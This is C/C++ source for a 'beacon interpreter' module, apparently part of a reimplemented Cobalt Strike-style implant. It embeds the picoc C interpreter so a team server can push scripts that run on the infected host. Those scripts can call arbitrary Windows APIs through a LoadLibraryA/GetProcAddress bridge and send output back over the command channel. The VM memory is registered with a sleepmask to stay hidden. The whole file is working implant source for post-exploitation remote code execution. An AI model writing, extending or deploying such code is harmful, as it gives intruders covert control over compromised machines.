/* ---------------------------------------------------------------------------
 * 4.13 Beacon Interpreter (tier-3 item 12).
 *
 * Official contract (4.13 "Lost In Translation" + Cobalt-Strike/
 * beacon-interpreter skills.md): C scripts run inside a VM baked into the
 * beacon; no implicit main() (top-level statements are the entry), packed
 * BOF-style arguments arrive through the runtime globals __argc (packed
 * byte length) and __argv (pointer to the packed buffer), native APIs are
 * declared with BOF DFR signatures `LIB$Func: conv ret (args);`, output
 * goes back through the Beacon output APIs.
 *
 * Our shape (documented divergences, see docs/TIER3-BATTLE.md):
 *   - the VM is vendored picoc v2.3.2 (BSD) compiled into the beacon; the
 *     team server ships the (rewritten) script source, not bytecode -
 *     official compiles to bytecode on the TS side.
 *   - DFR declaration lines are extracted on the TS side and every
 *     LIB$Func call site is rewritten to dfr_slot_<n>; the beacon binds
 *     each slot with a picoc prototype generated from the declared
 *     signature (fixed arity 0..8 - varargs FFI is rejected by lint).
 *   - supported FFI atoms: void i16 u16 i32 u32 ptr cstr (i64/u64/size_t
 *     are rejected by lint: picoc's integer types are 32-bit wide on this
 *     host ABI). Calling convention is irrelevant on x64 and ignored.
 *   - the beacon.h surface for scripts is BeaconPrint/BeaconOutput/
 *     BeaconArgInt/BeaconArgString + CALLBACK_* constants (the official
 *     variadic BeaconPrintf is not expressible with fixed-arity picoc
 *     prototypes; scripts format with the picoc string library instead).
 *   - x64 only; the x86 build answers with an explicit error task.
 *
 * Task wire (COMMAND_INTERPRETER, little-endian datap):
 *   [int scriptlen][script bytes]
 *   [int dfrn] { [z module][z func][z cc][z ret][z "t1,t2,..."] } *
 *   [int arglen][args blob]
 * ------------------------------------------------------------------------- */
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "../parse.h"
#include "../beacon.h"
#include "../commands.h"
#include "../track_memory.h"

extern "C" {
#include "picoc.h"
}

#ifdef _M_X64


/* crash triage probe (0xC0000028 BAD_STACK during the first live dispatch):
 * stage markers land in the spawn trace when enabled, otherwise near-free */
extern void spawn_log(const char * msg, long v);
#define BI_STAGE(m) spawn_log("binterp:" m, 0)

#define BI_MAX_DFR    64
#define BI_MAX_ARGS   8
#define BI_VM_STACK   (512 * 1024)      /* single picoc stack+heap block */
#define BI_SCRIPT_MAX (1024 * 1024)     /* 1MB script cap */
#define BI_OBUF_SZ    16384

typedef struct {
	char module[32];
	char func[64];
	int  cc;                 /* 0 = stdcall/omitted, 1 = cdecl (x64: same) */
	char ret[12];
	int  argc;
	char types[BI_MAX_ARGS][12];
} bi_dfr;

static bi_dfr  bi_dfrs[BI_MAX_DFR];
static int     bi_ndfr  = 0;
static char *  bi_argv  = NULL;
static int     bi_argc  = 0;
static void (*bi_cb)(char * buffer, int length, int type) = NULL;

/* ---- output plumbing: PlatformPutc lands here ---- */
static char bi_obuf[BI_OBUF_SZ];
static int  bi_opos = 0;

static void bi_flush(void) {
	if (bi_opos > 0 && bi_cb != NULL)
		bi_cb(bi_obuf, bi_opos, CALLBACK_OUTPUT);
	bi_opos = 0;
}

void bi_putc_raw(char c) {
	bi_obuf[bi_opos++] = c;
	if (bi_opos >= BI_OBUF_SZ - 1)
		bi_flush();
}

void bi_set_output(void (*cb)(char * buffer, int length, int type)) {
	bi_cb = cb;
}

/* ---- DFR slot trampolines: one C function per slot (picoc LibraryFunction
 * entries are plain function pointers, no closure context) ---- */
static void bi_dfr_call(int slot, struct ParseState * Parser, struct Value * ReturnValue,
                        struct Value ** Param, int NumArgs);

#define BI_SLOT(n) \
	static void bi_slot_##n(struct ParseState * P, struct Value * R, struct Value ** A, int N) { \
		bi_dfr_call(n, P, R, A, N); \
	}
BI_SLOT(0)  BI_SLOT(1)  BI_SLOT(2)  BI_SLOT(3)  BI_SLOT(4)  BI_SLOT(5)  BI_SLOT(6)  BI_SLOT(7)
BI_SLOT(8)  BI_SLOT(9)  BI_SLOT(10) BI_SLOT(11) BI_SLOT(12) BI_SLOT(13) BI_SLOT(14) BI_SLOT(15)
BI_SLOT(16) BI_SLOT(17) BI_SLOT(18) BI_SLOT(19) BI_SLOT(20) BI_SLOT(21) BI_SLOT(22) BI_SLOT(23)
BI_SLOT(24) BI_SLOT(25) BI_SLOT(26) BI_SLOT(27) BI_SLOT(28) BI_SLOT(29) BI_SLOT(30) BI_SLOT(31)
BI_SLOT(32) BI_SLOT(33) BI_SLOT(34) BI_SLOT(35) BI_SLOT(36) BI_SLOT(37) BI_SLOT(38) BI_SLOT(39)
BI_SLOT(40) BI_SLOT(41) BI_SLOT(42) BI_SLOT(43) BI_SLOT(44) BI_SLOT(45) BI_SLOT(46) BI_SLOT(47)
BI_SLOT(48) BI_SLOT(49) BI_SLOT(50) BI_SLOT(51) BI_SLOT(52) BI_SLOT(53) BI_SLOT(54) BI_SLOT(55)
BI_SLOT(56) BI_SLOT(57) BI_SLOT(58) BI_SLOT(59) BI_SLOT(60) BI_SLOT(61) BI_SLOT(62) BI_SLOT(63)

static void (*bi_slots[BI_MAX_DFR])(struct ParseState *, struct Value *, struct Value **, int) = {
	bi_slot_0,  bi_slot_1,  bi_slot_2,  bi_slot_3,  bi_slot_4,  bi_slot_5,  bi_slot_6,  bi_slot_7,
	bi_slot_8,  bi_slot_9,  bi_slot_10, bi_slot_11, bi_slot_12, bi_slot_13, bi_slot_14, bi_slot_15,
	bi_slot_16, bi_slot_17, bi_slot_18, bi_slot_19, bi_slot_20, bi_slot_21, bi_slot_22, bi_slot_23,
	bi_slot_24, bi_slot_25, bi_slot_26, bi_slot_27, bi_slot_28, bi_slot_29, bi_slot_30, bi_slot_31,
	bi_slot_32, bi_slot_33, bi_slot_34, bi_slot_35, bi_slot_36, bi_slot_37, bi_slot_38, bi_slot_39,
	bi_slot_40, bi_slot_41, bi_slot_42, bi_slot_43, bi_slot_44, bi_slot_45, bi_slot_46, bi_slot_47,
	bi_slot_48, bi_slot_49, bi_slot_50, bi_slot_51, bi_slot_52, bi_slot_53, bi_slot_54, bi_slot_55,
	bi_slot_56, bi_slot_57, bi_slot_58, bi_slot_59, bi_slot_60, bi_slot_61, bi_slot_62, bi_slot_63
};

/* runtime-built library tables (prototypes generated from the DFR table) */
static struct LibraryFunction bi_dfr_funcs[BI_MAX_DFR + 1];
static char bi_protos[BI_MAX_DFR][256];

/* map an FFI atom to its picoc parameter/return type spelling */
static const char * bi_type_of(const char * atom) {
	if (atom == NULL)
		return "int";
	if (strcmp(atom, "ptr") == 0 || strcmp(atom, "cstr") == 0)
		return "char *";
	return "int"; /* i16/u16/i32/u32 all narrow to picoc int */
}

static void bi_register_dfrs(Picoc * pc) {
	int i, j, n;
	for (i = 0; i < bi_ndfr; i++) {
		char * p = bi_protos[i];
		n = 0;
		if (strcmp(bi_dfrs[i].ret, "void") == 0)
			n += _snprintf(p + n, sizeof(bi_protos[0]) - n - 1, "void dfr_slot_%d(", i);
		else
			n += _snprintf(p + n, sizeof(bi_protos[0]) - n - 1, "%s dfr_slot_%d(",
				bi_type_of(bi_dfrs[i].ret), i);
		for (j = 0; j < bi_dfrs[i].argc; j++) {
			if (j > 0)
				p[n++] = ',';
			n += _snprintf(p + n, sizeof(bi_protos[0]) - n - 1, " %s", bi_type_of(bi_dfrs[i].types[j]));
		}
		if (bi_dfrs[i].argc == 0)
			n += _snprintf(p + n, sizeof(bi_protos[0]) - n - 1, "void)");
		else
			_snprintf(p + n, sizeof(bi_protos[0]) - n - 1, " )");
		strcat(p, ";");

		bi_dfr_funcs[i].Func      = bi_slots[i];
		bi_dfr_funcs[i].Prototype = p;
	}
	bi_dfr_funcs[bi_ndfr].Func = NULL;
	bi_dfr_funcs[bi_ndfr].Prototype = NULL;
	IncludeRegister(pc, "__dfr.h", NULL, &bi_dfr_funcs[0], NULL);
}

/* ---- FFI call bridge: x64 single calling convention, 0..8 args ---- */
static long long bi_val(struct Value * v) {
	if (v == NULL || v->Typ == NULL)
		return 0;
	switch (v->Typ->Base) {
	case TypePointer:
		return (long long)(size_t)v->Val->Pointer;
	case TypeChar:
	case TypeUnsignedChar:
		return v->Val->Character;
	case TypeShort:
	case TypeUnsignedShort:
		return v->Val->ShortInteger;
	case TypeLong:
	case TypeUnsignedLong:
		return v->Val->LongInteger;
	case TypeUnsignedInt:
		return v->Val->UnsignedInteger;
	case TypeEnum:
		return v->Val->Integer;
	case TypeInt:
	default:
		return v->Val->Integer;
	}
}

static void bi_store_ret(struct Value * rv, const char * atom, long long val) {
	if (rv == NULL || rv->Typ == NULL)
		return;
	if (rv->Typ->Base == TypePointer) {
		rv->Val->Pointer = (void *)(size_t)val;
		return;
	}
	rv->Val->Integer = (int)val;
}

typedef long long (WINAPI * bi_fn0)();
typedef long long (WINAPI * bi_fn1)(long long);
typedef long long (WINAPI * bi_fn2)(long long, long long);
typedef long long (WINAPI * bi_fn3)(long long, long long, long long);
typedef long long (WINAPI * bi_fn4)(long long, long long, long long, long long);
typedef long long (WINAPI * bi_fn5)(long long, long long, long long, long long, long long);
typedef long long (WINAPI * bi_fn6)(long long, long long, long long, long long, long long, long long);
typedef long long (WINAPI * bi_fn7)(long long, long long, long long, long long, long long, long long, long long);
typedef long long (WINAPI * bi_fn8)(long long, long long, long long, long long, long long, long long, long long, long long);

static void bi_dfr_call(int slot, struct ParseState * Parser, struct Value * ReturnValue,
                        struct Value ** Param, int NumArgs) {
	bi_dfr * d;
	HMODULE m;
	FARPROC fn;
	long long a[BI_MAX_ARGS];
	long long rv = 0;
	int i;

	(void)Parser;
	if (slot < 0 || slot >= bi_ndfr)
		return;
	d = &bi_dfrs[slot];

	m = GetModuleHandleA(d->module);
	if (m == NULL)
		m = LoadLibraryA(d->module);
	if (m == NULL) {
		if (bi_cb != NULL) {
			char msg[160];
			_snprintf(msg, sizeof(msg) - 1,
				"[-] interpreter: dfr_slot_%d cannot load module '%s' (GLE %lu)\n",
				slot, d->module, GetLastError());
			bi_cb(msg, (int)strlen(msg), CALLBACK_OUTPUT);
		}
		bi_store_ret(ReturnValue, d->ret, 0);
		return;
	}
	fn = GetProcAddress(m, d->func);
	if (fn == NULL) {
		if (bi_cb != NULL) {
			char msg[180];
			_snprintf(msg, sizeof(msg) - 1,
				"[-] interpreter: dfr_slot_%d: %s!%s not found\n", slot, d->module, d->func);
			bi_cb(msg, (int)strlen(msg), CALLBACK_OUTPUT);
		}
		bi_store_ret(ReturnValue, d->ret, 0);
		return;
	}

	for (i = 0; i < d->argc && i < NumArgs && i < BI_MAX_ARGS; i++)
		a[i] = bi_val(Param[i]);

	switch (d->argc) {
	case 0: rv = ((bi_fn0)fn)(); break;
	case 1: rv = ((bi_fn1)fn)(a[0]); break;
	case 2: rv = ((bi_fn2)fn)(a[0], a[1]); break;
	case 3: rv = ((bi_fn3)fn)(a[0], a[1], a[2]); break;
	case 4: rv = ((bi_fn4)fn)(a[0], a[1], a[2], a[3]); break;
	case 5: rv = ((bi_fn5)fn)(a[0], a[1], a[2], a[3], a[4]); break;
	case 6: rv = ((bi_fn6)fn)(a[0], a[1], a[2], a[3], a[4], a[5]); break;
	case 7: rv = ((bi_fn7)fn)(a[0], a[1], a[2], a[3], a[4], a[5], a[6]); break;
	default: rv = ((bi_fn8)fn)(a[0], a[1], a[2], a[3], a[4], a[5], a[6], a[7]); break;
	}

	bi_store_ret(ReturnValue, d->ret, rv);
}

/* ---- beacon.h library: output + packed-argument helpers ---- */
static void bi_nBeaconPrint(struct ParseState * Parser, struct Value * ReturnValue,
                            struct Value ** Param, int NumArgs) {
	(void)Parser; (void)NumArgs;
	if (bi_cb != NULL && Param[1] != NULL)
		bi_cb((char *)Param[1]->Val->Pointer,
		      (int)strlen((char *)Param[1]->Val->Pointer),
		      (int)bi_val(Param[0]));
	ReturnValue->Val->Integer = 0;
}

static void bi_nBeaconOutput(struct ParseState * Parser, struct Value * ReturnValue,
                             struct Value ** Param, int NumArgs) {
	(void)Parser; (void)NumArgs;
	if (bi_cb != NULL)
		bi_cb((char *)Param[1]->Val->Pointer, (int)bi_val(Param[2]), (int)bi_val(Param[0]));
	ReturnValue->Val->Integer = 0;
}

static void bi_nBeaconArgInt(struct ParseState * Parser, struct Value * ReturnValue,
                             struct Value ** Param, int NumArgs) {
	int off = (int)bi_val(Param[0]);
	int v = 0;
	(void)Parser; (void)NumArgs;
	if (bi_argv != NULL && off >= 0 && off + 4 <= bi_argc)
		memcpy(&v, bi_argv + off, 4);
	ReturnValue->Val->Integer = v;
}

/* BeaconArgString(off, out, max): read a [4B LE len][bytes+NUL] packed
 * string at byte offset `off` of __argv; returns its length or -1 */
static void bi_nBeaconArgString(struct ParseState * Parser, struct Value * ReturnValue,
                                struct Value ** Param, int NumArgs) {
	int off = (int)bi_val(Param[0]);
	char * dst = (char *)Param[1]->Val->Pointer;
	int max = (int)bi_val(Param[2]);
	unsigned int len = 0;
	(void)Parser; (void)NumArgs;
	ReturnValue->Val->Integer = -1;
	if (bi_argv == NULL || off < 0 || off + 4 > bi_argc)
		return;
	memcpy(&len, bi_argv + off, 4);
	if (len == 0 || off + 4 + (int)len > bi_argc || len > (unsigned int)max)
		return;
	memcpy(dst, bi_argv + off + 4, len);
	dst[len - 1] = '\0'; /* packed strings carry their NUL; force it anyway */
	ReturnValue->Val->Integer = (int)len;
}

static struct LibraryFunction bi_beacon_funcs[] = {
	{ bi_nBeaconPrint,     "int BeaconPrint(int type, char *text);" },
	{ bi_nBeaconOutput,    "int BeaconOutput(int type, char *data, int len);" },
	{ bi_nBeaconArgInt,    "int BeaconArgInt(int offset);" },
	{ bi_nBeaconArgString, "int BeaconArgString(int offset, char *out, int max);" },
	{ NULL, NULL }
};

static const char * bi_beacon_defs =
	"#define CALLBACK_OUTPUT 0\n"
	"#define CALLBACK_ERROR  13\n";

static const char * bi_windows_defs =
	"typedef unsigned long  DWORD;\n"
	"typedef int            BOOL;\n"
	"typedef unsigned char  BYTE;\n"
	"typedef unsigned short WORD;\n"
	"typedef char *         LPSTR;\n"
	"typedef char *         LPCSTR;\n"
	"typedef void *         LPVOID;\n"
	"typedef void *         HANDLE;\n"
	"#define TRUE 1\n"
	"#define FALSE 0\n"
	"#define MAX_PATH 260\n";

extern "C" void bi_library_init(Picoc * pc) {
	IncludeRegister(pc, "beacon.h", NULL, &bi_beacon_funcs[0], bi_beacon_defs);
	IncludeRegister(pc, "windows.h", NULL, NULL, bi_windows_defs);
	IncludeRegister(pc, "internal.h", NULL, NULL,
		"int DbgPrintf(char *t) { BeaconPrint(0, t); return 0; }\n");
}

/* ---- command entry ---- */
static char * bi_arg_z(datap * parser, char * buf, int max) {
	char * p = data_string_asciiz(parser);
	if (p == NULL)
		return NULL;
	strncpy(buf, p, max - 1);
	buf[max - 1] = '\0';
	return buf;
}

static int bi_split_types(char * csv, bi_dfr * d) {
	char * tok;
	int n = 0;
	tok = strtok(csv, ", \t");
	while (tok != NULL && n < BI_MAX_ARGS) {
		strncpy(d->types[n], tok, sizeof(d->types[0]) - 1);
		d->types[n][sizeof(d->types[0]) - 1] = '\0';
		n++;
		tok = strtok(NULL, ", \t");
	}
	return n;
}

void command_interpreter(char * buffer, int length, void (*callback)(char * buffer, int length, int type)) {
	datap parser;
	char * script;
	int scriptlen;
	char mbuf[32], fbuf[64], cbuf[16], rbuf[12], tbuf[128];
	int i;
	Picoc pc;
	char * glued;
	char msg[128];
	(void)msg;

	if (length < 4)
		return;

	BI_STAGE("entry");
	bi_cb = callback;
	bi_opos = 0;

	data_init(&parser, buffer, length);
	scriptlen = (int)data_int(&parser);
	if (scriptlen <= 0 || scriptlen > BI_SCRIPT_MAX || parser.length < scriptlen)
		return;
	script = data_ptr(&parser, scriptlen);
	if (script == NULL)
		return;

	bi_ndfr = (int)data_int(&parser);
	if (bi_ndfr < 0 || bi_ndfr > BI_MAX_DFR)
		bi_ndfr = 0;
	for (i = 0; i < bi_ndfr; i++) {
		if (bi_arg_z(&parser, mbuf, sizeof(mbuf)) == NULL) { bi_ndfr = i; break; }
		if (bi_arg_z(&parser, fbuf, sizeof(fbuf)) == NULL) { bi_ndfr = i; break; }
		if (bi_arg_z(&parser, cbuf, sizeof(cbuf)) == NULL) { bi_ndfr = i; break; }
		if (bi_arg_z(&parser, rbuf, sizeof(rbuf)) == NULL) { bi_ndfr = i; break; }
		if (bi_arg_z(&parser, tbuf, sizeof(tbuf)) == NULL) { bi_ndfr = i; break; }
		strncpy(bi_dfrs[i].module, mbuf, sizeof(bi_dfrs[i].module) - 1);
		bi_dfrs[i].module[sizeof(bi_dfrs[i].module) - 1] = '\0';
		strncpy(bi_dfrs[i].func, fbuf, sizeof(bi_dfrs[i].func) - 1);
		bi_dfrs[i].func[sizeof(bi_dfrs[i].func) - 1] = '\0';
		bi_dfrs[i].cc = (strcmp(cbuf, "cdecl") == 0) ? 1 : 0;
		strncpy(bi_dfrs[i].ret, rbuf, sizeof(bi_dfrs[i].ret) - 1);
		bi_dfrs[i].ret[sizeof(bi_dfrs[i].ret) - 1] = '\0';
		bi_dfrs[i].argc = bi_split_types(tbuf, &bi_dfrs[i]);
	}

	bi_argc = (int)data_int(&parser);
	if (bi_argc > 0 && parser.length > 0) {
		bi_argv = data_ptr(&parser, bi_argc);
		if (bi_argv == NULL)
			bi_argc = 0;
	}
	else {
		bi_argv = NULL;
		bi_argc = 0;
	}

	/* glue the slot include + script into one parse unit: __dfr.h must be
	 * pulled in before the first dfr_slot_N reference */
	glued = (char *)malloc(scriptlen + 256);
	if (glued == NULL)
		return;
	{
		int off = _snprintf(glued, 64, "#include <__dfr.h>\n");
		if (off < 0)
			off = 0;
		memcpy(glued + off, script, scriptlen);
		glued[off + scriptlen] = '\0';
	}

	BI_STAGE("pre-init");
	PicocInitialize(&pc, BI_VM_STACK);
	BI_STAGE("initialized");
	/* one tracked block = whole VM state is sleepmask-visible (see
	 * binterp_platform.cpp header note) */
	track_memory_add(pc.HeapMemory, BI_VM_STACK, TRACK_MEMORY_MALLOC, TRUE, NULL);

	bi_register_dfrs(&pc);
	BI_STAGE("dfr-registered");

	/* runtime globals (official 4.13 contract) */
	{
		static int          s_argc_dummy; /* VariableDefinePlatformVar needs
		                                     * lvalues that outlive the call */
		static char *       s_argv_dummy;
		s_argc_dummy = bi_argc;
		s_argv_dummy = bi_argv;
		VariableDefinePlatformVar(&pc, NULL, "__argc", &pc.IntType,
			(union AnyValue *)&s_argc_dummy, TRUE);
		VariableDefinePlatformVar(&pc, NULL, "__argv", pc.CharPtrType,
			(union AnyValue *)&s_argv_dummy, TRUE);
	}

	BI_STAGE("globals-defined");
	if (PicocPlatformSetExitPoint(&pc) == 0) {
		BI_STAGE("parsing");
		PicocParse(&pc, "script.c", glued, (int)strlen(glued), TRUE, TRUE, FALSE, FALSE);
		BI_STAGE("parsed");
	}
	else {
		char msg[128];
		_snprintf(msg, sizeof(msg) - 1,
			"[-] interpreter: script exited early (code %d)\n", pc.PicocExitValue);
		if (bi_cb != NULL)
			bi_cb(msg, (int)strlen(msg), CALLBACK_OUTPUT);
	}

	bi_flush();
	BI_STAGE("flushed");
	track_memory_remove(pc.HeapMemory);
	PicocCleanup(&pc);
	free(glued);
	bi_ndfr = 0;
}

#else /* !_M_X64 */

/* the platform shim references these unconditionally; the x86 build has no
 * VM so they are inert */
void bi_putc_raw(char c) {
	(void)c;
}

extern "C" void bi_library_init(Picoc * pc) {
	(void)pc;
}

void command_interpreter(char * buffer, int length, void (*callback)(char * buffer, int length, int type)) {
	const char * msg = "[-] beacon-interpreter: this build is x86; the interpreter VM ships x64-only\n";
	(void)buffer; (void)length;
	callback((char *)msg, (int)strlen(msg), CALLBACK_OUTPUT);
}

#endif
